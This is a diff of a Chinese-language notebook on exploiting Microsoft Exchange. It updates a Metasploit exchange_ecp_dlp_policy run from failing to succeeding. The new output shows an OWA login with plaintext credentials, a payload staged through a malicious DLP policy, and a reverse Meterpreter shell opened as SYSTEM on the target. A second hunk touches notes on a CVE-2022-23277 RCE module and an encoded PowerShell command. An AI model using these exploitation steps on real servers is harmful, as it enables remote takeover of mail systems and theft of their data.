@@ -377,20 +377,33 @@ Get-RoleGroup "dlp users" | Format-List
 
 3. metasploit exchange_ecp_dlp_policy 模块
 
-可以利用但是没有session返回，需要修改模块里的命令执行反弹shell功能
-
 ``` bash
 msf6 exploit(windows/http/exchange_ecp_dlp_policy) > run
 
-[*] Started reverse TCP handler on 192.168.14.128:4444
-[*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Exchange Server 15.1.2044 is a vulnerable build.
-[*] Logging in to OWA with creds administrator:xxxxxx
+[*] Started HTTPS reverse handler on https://192.168.123.1:8443
+[*] Executing automatic check (disable AutoCheck to override)
+[!] The service is running, but could not be validated. OWA is running at https://192.168.123.192/owa/
+[*] Logging in to OWA with creds Administrator:Passw0rd!
 [+] Successfully logged in to OWA
 [*] Retrieving ViewState from DLP policy creation page
 [+] Successfully retrieved ViewState
 [*] Creating custom DLP policy from malicious template
-[*] Exploit completed, but no session was created.
+[*] DLP policy name: Abbotstone Agricultural Property Unit Trust Data
+[*] Powershell command length: 2372
+[*] https://192.168.123.1:8443 handling request from 192.168.123.192; (UUID: rwlz4ahe) Staging x64 payload (201308 bytes) ...
+[*] Meterpreter session 1 opened (192.168.123.1:8443 -> 192.168.123.192:6951) at 2020-09-16 02:39:17 -0500
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+Computer        : WIN-365Q2VJJS17
+OS              : Windows 2016+ (10.0 Build 14393).
+Architecture    : x64
+System Language : en_US
+Domain          : GIBSON
+Logged On Users : 8
+Meterpreter     : x64/windows
+meterpreter >
 ```
 
 # CVE-2020-17083
@@ -1555,7 +1568,7 @@ psi.Arguments = " -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoAC
 
 3. 使用metasploit的[Microsoft Exchange Server ChainedSerializationBinder RCE模块](./CVE-2022-23277-main/exchange_chainedserializationbinder_rce.rb)
 
-能成功检测，但是无法执行文件没有session返回。需要进一步修改文件执行功能
+能成功检测，但是无法执行文件没有session返回?
 
  - ![](pics/CVE-2022-23277-0.png)
 
